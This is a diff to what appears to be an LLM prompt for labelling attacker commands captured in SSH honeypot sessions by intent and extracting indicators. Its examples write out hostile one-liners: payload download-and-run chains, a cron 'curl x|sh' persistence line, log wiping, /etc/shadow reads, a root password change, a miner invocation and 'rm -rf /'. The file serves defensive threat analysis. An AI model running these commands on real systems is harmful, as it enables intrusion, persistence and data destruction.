@@ -7,7 +7,7 @@ Return ONLY valid JSON matching this exact schema. Do NOT include any other text
 Schema:
 {
   "description": "plain-language description of what the command does and why it is interesting; length scales with command complexity (see DESCRIPTION RULES below)",
-  "intent": "one of: reconnaissance | initial_access | execution | persistence | privilege_escalation | defense_evasion | credential_access | discovery | lateral_movement | collection | command_and_control | exfiltration | impact | cryptomining | benign | unknown",
+  "intent": "one of: host_recon | download_ingress | execute_payload | install_persistence | defense_evasion | credential_data_access | account_manipulation | cryptomining | ddos_botnet | benign_noise | unknown",
   "iocs": {
     "urls":    ["full URLs found in the command if present"],
     "ips":     ["IPv4 or IPv6 addresses found if present"],
@@ -17,6 +17,47 @@ Schema:
   },
   "confidence": 1
 }
+
+INTENT RULES (this is the field most often gotten wrong — read carefully):
+These commands were captured AFTER the attacker authenticated, inside a live SSH
+session. Label "intent" with THIS command's own primary action — not the overall
+goal of the session it belongs to. Choose exactly one:
+
+- host_recon — enumerate the box / its environment: uname, /proc/cpuinfo, lscpu,
+  nproc, free, id, whoami, w, who, ps, ls, reading /etc/passwd as enumeration,
+  `crontab -l`. Fingerprinting the host.
+- download_ingress — fetch a remote payload to disk and stop there, with NO run
+  step in this line: wget, curl, tftp, ftpget, inbound scp/sftp.
+- execute_payload — run a dropped/staged binary or an inline interpreter: `./x`,
+  `sh -c <blob>`, a pipe into `sh`/`bash`, `busybox <applet>` that runs code.
+- install_persistence — survive reboot/eviction: cron entries, rc.local, systemd
+  units, init scripts, writing ~/.ssh/authorized_keys.
+- defense_evasion — anti-forensics, hide, or disable defenses: history wipe
+  (`history -c`, `> ~/.bash_history`), chattr, rm of logs/self, `iptables -F`,
+  stopping the firewall, killing rival miners or security tools, `setenforce 0`.
+- credential_data_access — read secret or exfiltratable material: /etc/shadow,
+  SSH private keys, wallets, .aws/credentials, database/browser dumps.
+- account_manipulation — change the box's accounts or access: passwd change,
+  useradd/usermod, edit /etc/sudoers, sshd_config PermitRootLogin.
+- cryptomining — install, configure, or run a coin miner: xmrig and friends,
+  stratum+tcp pools, mining config, `--donate-level`.
+- ddos_botnet — enlist in or operate a DDoS botnet, or destructive impact:
+  Mirai/Gafgyt enrollment, flood commands, `rm -rf /`, ransom.
+- benign_noise — login probes and non-actions: bare `exit`/`logout`, empty,
+  `echo <token>` connectivity tests, `cd`, version banners, scanner keepalives.
+- unknown — you genuinely cannot tell, or the line is truncated/gibberish.
+
+Tie-breakers:
+- Multi-stage line → label by the TERMINAL OBJECTIVE (the most consequential end
+  state), not the first step. `wget X -O a; chmod +x a; ./a` is execute_payload;
+  a bare `wget X -O a` with no run step is download_ingress.
+- `cat /etc/passwd` / `id` / `whoami` is host_recon (identity & capability
+  enumeration); reading /etc/shadow or private keys is credential_data_access.
+- A miner (xmrig, a stratum pool) is cryptomining even though it also "executes".
+- Flood / bot-enrollment / destruction is ddos_botnet even though it also "executes".
+- Use the co-occurrence and COMMANDS REFERENCED blocks to interpret ambiguous
+  TOOLING (what a binary does) — never to override this command's own action with
+  the session's broader goal.
 
 DESCRIPTION RULES:
 - Trivial / single-token commands (e.g. "ls", "./", "exit", "uname"): 1 short sentence.
@@ -38,6 +79,19 @@ CONFIDENCE RULES (integer 1-10):
 OTHER RULES:
 - Use empty arrays [] when nothing applies. Never invent IOCs that aren't literally present in the command text.
 - "intent" must be exactly one value from the enum. Use "unknown" if you cannot tell.
+
+INTENT EXAMPLES (command -> intent — why):
+- `uname -a` -> host_recon — prints kernel/host info; fingerprinting.
+- `cat /etc/passwd` -> host_recon — user enumeration, not secret material.
+- `cat /etc/shadow` -> credential_data_access — reads password hashes.
+- `wget http://x/m -O /tmp/a` -> download_ingress — fetches a payload, no run step.
+- `cd /tmp; wget http://x/m; chmod +x m; ./m` -> execute_payload — terminal step runs it.
+- `echo "*/5 * * * * curl x|sh" >> /etc/crontab` -> install_persistence — cron survives reboot.
+- `history -c; rm -f /var/log/wtmp` -> defense_evasion — wipes forensic traces.
+- `echo newpass | passwd root` -> account_manipulation — changes account access.
+- `./xmrig -o stratum+tcp://pool:3333` -> cryptomining — runs a coin miner.
+- `/bin/busybox MIRAI` -> ddos_botnet — Mirai-family bot enrollment.
+- `exit` -> benign_noise — session teardown, no action.
 
 CO-OCCURRENCE CONTEXT:
 The block below lists OTHER commands the same SSH sessions ran alongside the
